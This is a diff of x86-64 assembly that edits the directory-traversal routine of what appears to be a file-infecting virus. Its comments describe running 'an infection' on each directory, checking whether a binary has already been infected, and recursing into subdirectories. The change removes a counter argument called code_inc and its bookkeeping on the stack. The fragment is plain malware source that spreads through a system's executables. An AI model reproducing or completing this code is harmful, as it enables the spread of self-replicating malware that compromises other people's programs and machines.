@@ -9,7 +9,7 @@ section .text
 ;;		read_dir
 ;;
 ;; SYNOPSYS
-;;		void	read_dir(bool recur, char *actual_dir, char *path_of_dir, long code_inc)
+;;		void	read_dir(bool recur, char *actual_dir, char *path_of_dir)
 ;;
 ;; DESCRIPTION
 ;;		Runs an infection on the directory pointed by actual_dir at path_of_dir.
@@ -41,7 +41,6 @@ section .text
 ;;		rsp + 352	: nb_thread launched. UNUSED
 ;;		rsp + 360	: bool, indicating if a binary have already been infected in the current directory
 ;;		rsp + 368	: bool, enable recursif
-;;		rsp + 376	: code_inc
 ;;		rsp - size	: size of total path for this dir
 ;; --------------------------------------------------------------------------------------------
 
@@ -55,7 +54,6 @@ _read_dir:
 	mov		rax, QWORD [rsp + 424]		; 1st arg (bool recur)
 
 	;; Save up arguments
-	mov		QWORD [rsp + 376], rdx
 	mov		QWORD [rsp + 368], rax
 	mov		QWORD [rsp + 312], rdi
 	mov		QWORD [rsp + 344], rsi
@@ -275,12 +273,10 @@ _treat_normally:
 	mov		r10, 1						; we set the recursif mode
 
 _call_treat_file:
-	mov r11, QWORD [r11 + 376]
 	call _treat_file
 	
 	;; Restore stack frame after function call
 	add rsp, QWORD [rsp]
-	add QWORD [rsp + 376], 0x00000001
 	
 	;; If we didn't forked, we just continue normally
 	cmp		rax, 0 
@@ -304,8 +300,6 @@ _recursiv_infect:
 	mov rdi, QWORD [rsp + 296]
 	add rdi, 19
 	mov rsi, rsp
-	add QWORD [rsp + 376], 0x00010000
-	mov rdx, QWORD [rsp + 376]
 	mov r10, QWORD [rsp + 336] 
 		sub rsi, r10
 		sub rsp, r10
